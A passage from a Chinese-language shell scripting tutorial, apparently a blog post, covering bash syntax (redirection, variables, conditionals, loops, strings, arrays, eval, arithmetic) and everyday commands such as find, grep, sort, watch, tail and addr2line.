<h2 id="3-常用语法详解"><a href="#3-常用语法详解" class="headerlink" title="3. 常用语法详解"></a>3. 常用语法详解</h2><h3 id="3-1-输入出重定向"><a href="#3-1-输入出重定向" class="headerlink" title="3.1. &lt;&gt; 输入出重定向"></a>3.1. <code>&lt;&gt;</code> 输入出重定向</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls ./ &gt;a.text           # 正确输出到a.txt(覆盖)</span><br><span class="line">ls ./ 1&gt;a.text          # 正确输出到a.txt(覆盖)</span><br><span class="line">ls ./ 2&gt;a.txt           # 错误输出到a.txt(覆盖)</span><br><span class="line">ls ./ 2&gt;a.txt           # 错误输出到a.txt(覆盖)</span><br><span class="line">ls ./ &gt;a.txt 2&gt;&amp;1       # 标准输出和标准错误输出到a.txt(覆盖)</span><br><span class="line">ls ./ &amp;&gt;a.txt           # 标准输出和标准错误输出到a.txt(覆盖)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">追加使用&gt;&gt;</span></span><br><span class="line">ls ./ &gt;&gt;a.text          # 正确输出到a.txt(追加)</span><br><span class="line"></span><br><span class="line">ls ./ 2&gt;&amp;1              # 错误输出到标准输出</span><br><span class="line"></span><br><span class="line">echo &quot;test&quot; &gt;&amp;2         # 将字符串输出到stderr</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt; 将文件内容作为标准输入</span></span><br><span class="line">while read -r line; do</span><br><span class="line">    echo &quot;$line&quot;</span><br><span class="line">done &lt; test.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;&lt;&lt;的含义，相当于管道，把字符串当作标准输入传给命令</span></span><br><span class="line">echo &quot;$a&quot; | grep &quot;xxx&quot;</span><br><span class="line">grep &quot;xxx&quot; &lt;&lt;&lt; &quot;$a&quot;</span><br></pre></td></tr></table></figure>

<h3 id="3-2-意义"><a href="#3-2-意义" class="headerlink" title="3.2. $ 意义"></a>3.2. $ 意义</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">$      <span class="comment"># Shell本身的PID（ProcessID）</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">!      <span class="comment"># Shell最后运行的后台Process的PID</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">UID    <span class="comment"># 当前用户的id</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">PPID   <span class="comment"># 父进程id</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">?      <span class="comment"># 最后运行的命令的结束代码（返回值）</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">-      <span class="comment"># 使用Set命令设定的Flag一览</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">*      <span class="comment"># 所有参数列表。如*所有参数列表。如&quot;*“用「”」括起来的情况、以&quot;$1 $2 … $n&quot;的形式输出所有参数。</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">@      <span class="comment"># 所有参数列表。如@所有参数列表。如&quot;@“用「”」括起来的情况、以&quot;$1 $2 … $n&quot; 的形式输出所有参数。</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="comment">#      # 添加到Shell的参数个数</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">0      <span class="comment"># Shell本身的文件名</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1～n   <span class="comment"># 添加到Shell的各参数值。$1是第1参数、$2是第2参数…</span></span></span><br></pre></td></tr></table></figure>

<h3 id="3-3-cd-跳转目录命令"><a href="#3-3-cd-跳转目录命令" class="headerlink" title="3.3. cd 跳转目录命令"></a>3.3. cd 跳转目录命令</h3><p><strong>特殊跳转</strong></p>
<ul>
<li>跳转上一级 <code>..</code></li>
<li>跳转当前目录 <code>.</code></li>
<li>跳转当前用户目录 <code>~</code></li>
<li>跳转根目录 <code>/</code></li>
<li>跳转上一个目录 <code>cd -</code></li>
<li>跳转前n目录 <code>cd -n</code></li>
<li>跳转后n目录 <code>cd +n</code></li>
</ul>
<h3 id="3-4-if-条件判断"><a href="#3-4-if-条件判断" class="headerlink" title="3.4. if 条件判断"></a>3.4. if 条件判断</h3><p><strong>文件表达式</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if [ -e file ]      # 如果文件或者目录存在，不管有没有权限</span><br><span class="line">if [ -f file ]      # 如果文件是普通文件，不是目录或者设备文件</span><br><span class="line">if [ -b file ]      # 如果文件是块设备文件</span><br><span class="line">if [ -c file ]      # 如果文件是字符设备文件</span><br><span class="line">if [ -L file ]      # 如果文件是符号文件</span><br><span class="line">if [ -d ...  ]      # 如果目录存在</span><br><span class="line">if [ -s file ]      # 如果文件存在且非空</span><br><span class="line">if [ -r file ]      # 如果文件存在且可读</span><br><span class="line">if [ -w file ]      # 如果文件存在且可写</span><br><span class="line">if [ -x file ]      # 如果文件存在且可执行</span><br></pre></td></tr></table></figure>

<p><strong>整数变量表达式</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if [ int1 -eq int2 ]        # 如果int1等于int2</span><br><span class="line">if [ int1 -ne int2 ]        # 如果不等于</span><br><span class="line">if [ int1 -ge int2 ]        # 如果&gt;=</span><br><span class="line">if [ int1 -gt int2 ]        # 如果&gt;</span><br><span class="line">if [ int1 -le int2 ]        # 如果&lt;=</span><br><span class="line">if [ int1 -lt int2 ]        # 如果&lt;</span><br></pre></td></tr></table></figure>

<p><strong>字符串变量表达式</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if  [ $a = $b ]                     # 如果string1等于string2</span><br><span class="line">                                    # 字符串允许使用赋值号做等号</span><br><span class="line">if  [ $string1 != $string2 ]        # 如果string1不等于string2</span><br><span class="line">if  [ -n $string ]                  # 如果string 非空(非0），返回0(true)</span><br><span class="line">if  [ -z $string ]                  # 如果string 为空</span><br><span class="line">if  [ $sting ]                      # 如果string 非空，返回0 (和-n类似)</span><br></pre></td></tr></table></figure>

<h3 id="3-5-for-循环"><a href="#3-5-for-循环" class="headerlink" title="3.5. for 循环"></a>3.5. for 循环</h3><h4 id="1-文件遍历"><a href="#1-文件遍历" class="headerlink" title="(1) 文件遍历"></a>(1) 文件遍历</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">此行代表以换行符为分割，默认为空格、\t和\n</span></span><br><span class="line">IFS=$&#x27;\n&#x27;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将test.txt的内容按行分割到value输出</span></span><br><span class="line">for value in $(cat test.txt)</span><br><span class="line">do</span><br><span class="line">    echo &quot;$value&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h4 id="2-index递增形式"><a href="#2-index递增形式" class="headerlink" title="(2) index递增形式"></a>(2) index递增形式</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for ((i=0;i&lt;2;i++)); do</span><br><span class="line">    echo &quot;$i&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h3 id="3-6-while-循环"><a href="#3-6-while-循环" class="headerlink" title="3.6. while 循环"></a>3.6. while 循环</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">按行读取文件内容</span></span><br><span class="line">while IFS= read -r value</span><br><span class="line">do</span><br><span class="line">    echo &quot;$value&quot;</span><br><span class="line">done &lt; &quot;test.txt&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">按行读取变量内容</span></span><br><span class="line">while IFS= read -r value</span><br><span class="line">do</span><br><span class="line">    echo &quot;$value&quot;</span><br><span class="line">done &lt;&lt;&lt; &quot;$test&quot;</span><br></pre></td></tr></table></figure>

<h3 id="3-7-switch-语句"><a href="#3-7-switch-语句" class="headerlink" title="3.7. switch 语句"></a>3.7. switch 语句</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">case &quot;$1&quot; in</span><br><span class="line">start)</span><br><span class="line">    check_start &quot;$@&quot;</span><br><span class="line">    ;;</span><br><span class="line">stop)</span><br><span class="line">    check_stop &quot;$@&quot;</span><br><span class="line">    ;;</span><br><span class="line">check)</span><br><span class="line">    check_service &quot;$@&quot;</span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">    echo &quot;Usage: check_handle_service.sh start|stop|check [service]&quot;</span><br><span class="line">    exit 1</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<h2 id="4-函数调用"><a href="#4-函数调用" class="headerlink" title="4. 函数调用"></a>4. 函数调用</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">abc() &#123;</span><br><span class="line">    # ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">abc</span><br></pre></td></tr></table></figure>

<p>函数调用不加括号</p>
<h2 id="5-字符串操作"><a href="#5-字符串操作" class="headerlink" title="5. 字符串操作"></a>5. 字符串操作</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">string=&quot;12348213&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">字符串长度</span></span><br><span class="line">echo $&#123;#string&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">字符串最后一个字符，注意中间有一个空格</span></span><br><span class="line">echo &quot;$&#123;string: -1&#125;&quot;</span><br></pre></td></tr></table></figure>

<h3 id="5-1-字符串替换"><a href="#5-1-字符串替换" class="headerlink" title="5.1. 字符串替换"></a>5.1. 字符串替换</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $&#123;string/23/bb&#125;   # 替换一次</span><br><span class="line">echo $&#123;string//23/bb&#125;  # 双斜杠替换所有匹配</span><br></pre></td></tr></table></figure>

<h3 id="5-2-字符串截取"><a href="#5-2-字符串截取" class="headerlink" title="5.2. 字符串截取"></a>5.2. 字符串截取</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除最后一个/及前面所有。作用是删除路径，只留文件名</span></span><br><span class="line">echo $&#123;string##*/&#125;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除最后一个/及后面所有。作用是删除文件名，只留路径名</span></span><br><span class="line">echo $&#123;string%/*&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>#:表示从左开始算起，并且截取第一个匹配的字符</li>
<li>##:表示从左开始算起，并且截取最后一个匹配的字符</li>
<li>%:表示从右开始算起，并且截取第一个匹配的字符</li>
<li>%%:表示从右开始算起，并且截取最后一个匹配的字符</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">截取给定一段，m开始截取n个</span></span><br><span class="line">echo &quot;$&#123;str:m:n&#125;&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">截取给定一段，m开始到结尾</span></span><br><span class="line">echo &quot;$&#123;str:m&#125;&quot;</span><br></pre></td></tr></table></figure>

<h3 id="5-3-字符串遍历"><a href="#5-3-字符串遍历" class="headerlink" title="5.3. 字符串遍历"></a>5.3. 字符串遍历</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">string=&quot;abc</span><br><span class="line">b c     d&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这样会根据空格、换行和制表符分开</span></span><br><span class="line">for item in $string; do</span><br><span class="line">    echo &quot;s $item e&quot;</span><br><span class="line">done</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">加了引号会认为整个字符串为一个</span></span><br><span class="line">for item in &quot;$string&quot;; do</span><br><span class="line">    echo &quot;s $item e&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h2 id="6-数组"><a href="#6-数组" class="headerlink" title="6. 数组"></a>6. 数组</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">数组声明</span></span><br><span class="line">test_arr=(</span><br><span class="line">    &quot;abc&quot;</span><br><span class="line">    &quot;dce&quot;</span><br><span class="line">)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">数组长度，bash 5.0不用加[@]，但是4.2就需要</span></span><br><span class="line">len=&quot;$&#123;#test_arr[@]&#125;&quot;</span><br></pre></td></tr></table></figure>

<h3 id="6-1-数组遍历"><a href="#6-1-数组遍历" class="headerlink" title="6.1. 数组遍历"></a>6.1. 数组遍历</h3><p>数组遍历分为几种形式</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service_list=(</span><br><span class="line">    &quot;abc&quot;</span><br><span class="line">    &quot;ddd&quot;</span><br><span class="line">    &quot;dd d&quot;</span><br><span class="line">)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">for</span> <span class="keyword">in</span> 形式，在脚本中，不加双引号，第三个元素会拆分成两个元素</span></span><br><span class="line">for sv in &quot;$&#123;service_list[@]&#125;&quot;; do</span><br><span class="line">    echo &quot;$sv&quot;</span><br><span class="line">done</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">i遍历的形式</span></span><br><span class="line">len=&quot;$&#123;#service_list[@]&#125;&quot;</span><br><span class="line">for ((i=0;i&lt;&quot;$len&quot;;i++)); do</span><br><span class="line">    echo &quot;a $&#123;service_list[i]&#125; b&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<ul>
<li>低版本shell中，local不能修饰数组</li>
</ul>
<h3 id="6-2-数组拷贝"><a href="#6-2-数组拷贝" class="headerlink" title="6.2. 数组拷贝"></a>6.2. 数组拷贝</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service_list=(</span><br><span class="line">    &quot;abc&quot;</span><br><span class="line">    &quot;ddd&quot;</span><br><span class="line">    &quot;dd d&quot;</span><br><span class="line">)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这样拿到的是原数组</span></span><br><span class="line">arr_cp=(&quot;$&#123;service_list[@]&#125;&quot;)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这样拿到的是数组转字符串再次根据空格、换行和制表符再次分割的数组</span></span><br><span class="line">arr1_cp=(&#123;service_list[@]&#125;)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这样拿到的是个字符串</span></span><br><span class="line">arr2_cp=&quot;$&#123;service_list[@]&#125;&quot;</span><br></pre></td></tr></table></figure>

<h2 id="7-eval"><a href="#7-eval" class="headerlink" title="7. eval"></a>7. eval</h2><ul>
<li>eval是将字符串转成命令执行</li>
<li>可用于在脚本中将字符串转成变量名执行</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service_list=(</span><br><span class="line">    &quot;abc&quot;</span><br><span class="line">    &quot;ddd&quot;</span><br><span class="line">    &quot;dd d&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">str=&quot;service_list&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下面这句话将转成 <span class="built_in">test</span>=(<span class="string">&quot;<span class="variable">$&#123;service_list[@]&#125;</span>&quot;</span>) 执行，即拷贝数组</span></span><br><span class="line">eval &quot;test=(\&quot;\$&#123;$&#123;str&#125;[@]&#125;\&quot;)&quot;</span><br><span class="line"></span><br><span class="line">for item in &quot;$&#123;test[@]&#125;&quot;; do</span><br><span class="line">    echo &quot;s $item e&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h2 id="8-bash和source、-的区别"><a href="#8-bash和source、-的区别" class="headerlink" title="8. bash和source、.的区别"></a>8. bash和source、<code>.</code>的区别</h2><ul>
<li>source和<code>.</code>是一样的</li>
<li>三者都可以不需要文件有可执行权限</li>
<li>bash类似于fork了一个子进程，内部变量和父进程没关系，但是父进程会等待子进程结果</li>
<li>source和<code>.</code>更像直接把文件内容拷贝到位置上执行，主要用于导入变量和函数</li>
</ul>
<h2 id="9-算术表达式"><a href="#9-算术表达式" class="headerlink" title="9. 算术表达式"></a>9. 算术表达式</h2><h3 id="9-1-i-表示"><a href="#9-1-i-表示" class="headerlink" title="9.1. i++表示"></a>9.1. i++表示</h3><h4 id="1-使用let表示"><a href="#1-使用let表示" class="headerlink" title="(1) 使用let表示"></a>(1) 使用let表示</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">i=0</span><br><span class="line"></span><br><span class="line">let i+=1</span><br><span class="line">let &#x27;i+=1&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="2-用-，这种用法常见于for循环中"><a href="#2-用-，这种用法常见于for循环中" class="headerlink" title="(2) 用(())，这种用法常见于for循环中"></a>(2) 用<code>(())</code>，这种用法常见于for循环中</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">((i++))</span><br></pre></td></tr></table></figure>

<h4 id="3-用expr"><a href="#3-用expr" class="headerlink" title="(3) 用expr"></a>(3) 用expr</h4><ul>
<li>中间要有空格，否则就成字符串拼接了</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">i=0</span><br><span class="line">i=`expr $i + 1`</span><br><span class="line">echo &quot;$i&quot;       # 1</span><br><span class="line">i=`expr $i+1`</span><br><span class="line">echo &quot;$i&quot;       # 1+1</span><br></pre></td></tr></table></figure>

<h4 id="4-用如下模式"><a href="#4-用如下模式" class="headerlink" title="(4) 用如下模式"></a>(4) 用如下模式</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">i=$[$i+1];      # 分号不能少</span><br><span class="line">i=$(($i+1))     # 中间可以加空格</span><br></pre></td></tr></table></figure>

<h1 id="二、系统命令详解"><a href="#二、系统命令详解" class="headerlink" title="二、系统命令详解"></a>二、系统命令详解</h1><h2 id="1-find-文件查找"><a href="#1-find-文件查找" class="headerlink" title="1. find 文件查找"></a>1. find 文件查找</h2><h3 id="1-1-选项"><a href="#1-1-选项" class="headerlink" title="1.1. 选项"></a>1.1. 选项</h3><ul>
<li><code>-type</code>: 类型，d为文件夹，f为文件</li>
<li><code>-name</code>: 文件名称，支持<code>*</code></li>
<li><code>-atime</code>: 访问时间，后跟参数，查看示例</li>
<li><code>-mtime</code>: 修改时间，后跟参数，查看示例</li>
<li><code>-ctime</code>: 元数据修改时间，后跟参数，查看示例</li>
</ul>
<h3 id="1-2-实例"><a href="#1-2-实例" class="headerlink" title="1.2. 实例"></a>1.2. 实例</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找当前目录下文件类型的，修改时间在0.5天以内的文件</span></span><br><span class="line">find ./ -type f -mtime -0.5</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找当前目录下文件类型的所有php文件</span></span><br><span class="line">find ./ -type f -name &quot;*.php&quot;</span><br></pre></td></tr></table></figure>

<h3 id="1-3-统计代码行数"><a href="#1-3-统计代码行数" class="headerlink" title="1.3. 统计代码行数"></a>1.3. 统计代码行数</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">统计所有go文件，排除单测文件的代码行数，去除空行</span></span><br><span class="line">=&gt; find /path/to/xxx -type f \( -name &quot;*.go&quot; -a -not -name &quot;*_test.go&quot; \) -exec grep -v &#x27;^$&#x27; &#123;&#125; \; | wc -l</span><br><span class="line">1374</span><br><span class="line">=&gt; find /path/to/xxx -type f \( -name &quot;*.go&quot; -a -not -name &quot;*_test.go&quot; \)</span><br><span class="line">/path/to/xxx/aaa.go</span><br><span class="line">/path/to/xxx/bbb.go</span><br><span class="line">/path/to/xxx/ccc.go</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">统计所有单测文件的代码行数，去除空行</span></span><br><span class="line">=&gt; find /path/to/xxx -type f \( -name &quot;*_test.go&quot; \) -exec grep -v &#x27;^$&#x27; &#123;&#125; \; | wc -l</span><br><span class="line">1795</span><br></pre></td></tr></table></figure>

<h2 id="2-file"><a href="#2-file" class="headerlink" title="2. file"></a>2. file</h2><h3 id="2-1-实例"><a href="#2-1-实例" class="headerlink" title="2.1. 实例"></a>2.1. 实例</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看文件类型，不显示文件名</span></span><br><span class="line">=&gt; file -b test.txt</span><br><span class="line">ASCII text</span><br></pre></td></tr></table></figure>

<h2 id="3-tr"><a href="#3-tr" class="headerlink" title="3. tr"></a>3. tr</h2><h3 id="3-1-实例"><a href="#3-1-实例" class="headerlink" title="3.1. 实例"></a>3.1. 实例</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">大小写转化</span></span><br><span class="line">echo &quot;HELLO&quot; | tr &#x27;[:upper:]&#x27; &#x27;[:lower:]&#x27;</span><br><span class="line">echo &quot;hello&quot; | tr &#x27;[:lower:]&#x27; &#x27;[:upper:]&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="4-watch"><a href="#4-watch" class="headerlink" title="4. watch"></a>4. watch</h2><p>watch命令以周期性的方式执行给定的指令，指令输出以全屏方式显示。watch是一个非常实用的命令，基本所有的Linux发行版都带有这个小工具，如同名字一样，watch可以帮你监测一个命令的运行结果，省得你一遍遍的手动运行。</p>
<h3 id="4-1-选项"><a href="#4-1-选项" class="headerlink" title="4.1. 选项"></a>4.1. 选项</h3><ul>
<li>-n：指定指令执行的间隔时间（秒）；</li>
<li>-d：高亮显示指令输出信息不同之处；</li>
<li>-t：不显示标题。</li>
</ul>
<h3 id="4-2-参数"><a href="#4-2-参数" class="headerlink" title="4.2. 参数"></a>4.2. 参数</h3><p>指令：需要周期性执行的指令。</p>
<h3 id="4-3-实例"><a href="#4-3-实例" class="headerlink" title="4.3. 实例"></a>4.3. 实例</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">watch uptime</span><br><span class="line">watch -t uptime</span><br><span class="line">watch -d -n 1 netstat -ntlp</span><br><span class="line">watch -d &#x27;ls -l | fgrep goface&#x27;     //监测goface的文件</span><br><span class="line">watch -t -differences=cumulative uptime</span><br><span class="line">watch -n 60 from            //监控mail</span><br><span class="line">watch -n 1 &quot;df -i;df&quot;       //监测磁盘inode和block数目变化情况</span><br></pre></td></tr></table></figure>

<h2 id="5-tail-实时查看文件内容（可用于查看log文件）"><a href="#5-tail-实时查看文件内容（可用于查看log文件）" class="headerlink" title="5. tail 实时查看文件内容（可用于查看log文件）"></a>5. tail 实时查看文件内容（可用于查看log文件）</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tail -f (fileName)</span><br></pre></td></tr></table></figure>

<h3 id="5-1-tail显示高亮"><a href="#5-1-tail显示高亮" class="headerlink" title="5.1. tail显示高亮"></a>5.1. tail显示高亮</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tail -f sys.log | perl -pe &#x27;s/(关键词1)|(关键词2)|(关键词3)/\e[1;颜色1$1\e[0m\e[1;颜色2$2\e[0m\e[1;颜色3$3\e[0m/g&#x27;</span><br></pre></td></tr></table></figure>
<p><strong>两个示例</strong></p>
<ul>
<li>黄字，高亮加粗显示 <code>[1;33m</code></li>
<li>红底黄字，高亮加粗显示 <code>[1;41;33m</code></li>
</ul>
<p><strong>效果配置列举</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前景色</span><br><span class="line">30m：黑</span><br><span class="line">31m：红</span><br><span class="line">32m：绿</span><br><span class="line">33m：黄</span><br><span class="line">34m：蓝</span><br><span class="line">35m：紫</span><br><span class="line">36m：青</span><br><span class="line">37m：白</span><br><span class="line"></span><br><span class="line">背景色</span><br><span class="line">40：黑</span><br><span class="line">41：红</span><br><span class="line">42：绿</span><br><span class="line">43：黄</span><br><span class="line">44：蓝</span><br><span class="line">45：紫</span><br><span class="line">46：青</span><br><span class="line">47：白</span><br><span class="line"></span><br><span class="line">动效设置</span><br><span class="line">[1; 设置高亮加粗</span><br><span class="line">[4; 下划线</span><br><span class="line">[5; 闪烁</span><br></pre></td></tr></table></figure>

<h2 id="6-sort-排序"><a href="#6-sort-排序" class="headerlink" title="6. sort 排序"></a>6. sort 排序</h2><h3 id="6-1-选项解释"><a href="#6-1-选项解释" class="headerlink" title="6.1. 选项解释"></a>6.1. 选项解释</h3><ul>
<li><code>-u</code>: 排序后去重</li>
<li><code>-V</code>: 版本号类型排序，如<code>2.1.10</code></li>
<li><code>-n</code>: 数字排序而非字典序</li>
</ul>
<h3 id="6-2-一些基本操作"><a href="#6-2-一些基本操作" class="headerlink" title="6.2. 一些基本操作"></a>6.2. 一些基本操作</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将test.txt中排序并去重，但是只输出到控制台，可以用&gt;写到文件</span></span><br><span class="line">cat test.txt | sort -u</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">sort</span> -V 可以排序版本号类型，如判断 2.1.9和2.1.10</span></span><br><span class="line">xxx | sort -V</span><br></pre></td></tr></table></figure>

<h2 id="7-grep-查找内容"><a href="#7-grep-查找内容" class="headerlink" title="7. grep 查找内容"></a>7. grep 查找内容</h2><ul>
<li><code>-r</code>: 遍历子目录</li>
<li><code>-n</code>: 遍历行数</li>
<li><code>-i</code>: 大小写无关</li>
<li><code>-v</code>: 排除</li>
<li><code>-E</code>: 衍生为正则表达式（用|代表或等）</li>
<li><code>-o</code>: 正则只输出PATTERN部分</li>
<li><code>-c</code>: 统计行数</li>
<li><code>--include=&quot;*.c&quot;</code>: 包含某个后缀的文件，可以多次设置<code>--include</code></li>
</ul>
<h3 id="7-1-内容匹配"><a href="#7-1-内容匹配" class="headerlink" title="7.1. 内容匹配"></a>7.1. 内容匹配</h3><ul>
<li>查找字符串用<code>^</code>代表开头，用<code>$</code>代表结束，可以使用<code>^xxx$</code>进行全匹配</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">匹配ab开头的字符串</span></span><br><span class="line">grep &quot;^ab&quot; test.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">匹配bc结束的字符串</span></span><br><span class="line">grep &quot;ab$&quot; test.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">全匹配abc</span></span><br><span class="line">grep &quot;^abc$&quot; test.txt</span><br></pre></td></tr></table></figure>

<h3 id="7-2-查找进程排除grep"><a href="#7-2-查找进程排除grep" class="headerlink" title="7.2. 查找进程排除grep"></a>7.2. 查找进程排除grep</h3><ul>
<li>通常使用<code>ps + grep</code>查找进程，但是会多出一行当前查找的grep进程</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps -aux | grep xxx | grep -v grep</span><br></pre></td></tr></table></figure>

<h3 id="7-3-查找包含内容的有几行"><a href="#7-3-查找包含内容的有几行" class="headerlink" title="7.3. 查找包含内容的有几行"></a>7.3. 查找包含内容的有几行</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">相当于 <span class="built_in">cat</span> test.txt | grep <span class="string">&quot;test&quot;</span> | <span class="built_in">wc</span> -l</span></span><br><span class="line">grep -c &quot;test&quot; test.txt</span><br></pre></td></tr></table></figure>

<h3 id="7-4-查找目录下所有文件匹配对应字符串"><a href="#7-4-查找目录下所有文件匹配对应字符串" class="headerlink" title="7.4. 查找目录下所有文件匹配对应字符串"></a>7.4. 查找目录下所有文件匹配对应字符串</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep -nr &quot;test&quot; ./</span><br></pre></td></tr></table></figure>
<h3 id="7-5-正则查找，只显示匹配段"><a href="#7-5-正则查找，只显示匹配段" class="headerlink" title="7.5. 正则查找，只显示匹配段"></a>7.5. 正则查找，只显示匹配段</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示 APPVERSION=abc 到|停止，即所有非|都匹配，匹配多个</span></span><br><span class="line">echo &quot;APPVERSION=abc|ddd&quot; | grep -o &quot;APPVERSION=[^|]*&quot;</span><br></pre></td></tr></table></figure>

<h2 id="8-wc-查看文件或者内容行数"><a href="#8-wc-查看文件或者内容行数" class="headerlink" title="8. wc 查看文件或者内容行数"></a>8. wc 查看文件或者内容行数</h2><ul>
<li>结合查找进程可以返回匹配的进程个数</li>
<li><font color="red"><code>wc -l</code>返回的是<code>\n</code>的个数，如果最后一行没有换行，将不会统计最后一行</font></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps -aux | grep xxx | grep -v grep | wc -l</span><br></pre></td></tr></table></figure>

<h2 id="9-addr2line-根据地址定位代码位置"><a href="#9-addr2line-根据地址定位代码位置" class="headerlink" title="9. addr2line 根据地址定位代码位置"></a>9. addr2line 根据地址定位代码位置</h2><p>示例</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; addr2line 0x2026 -e run -f</span><br><span class="line">main</span><br><span class="line">/xxxx/xxxx/xxxx/xxxx/main.cpp:39</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-e</code>: 指定可执行文件</li>
<li><code>-f</code>: 显示函数名</li>
</ul>
<h3 id="9-1-注意事项"><a href="#9-1-注意事项" class="headerlink" title="9.1. 注意事项"></a>9.1. 注意事项</h3><ul>
<li>gcc编译需要添加<code>-g</code>参数</li>
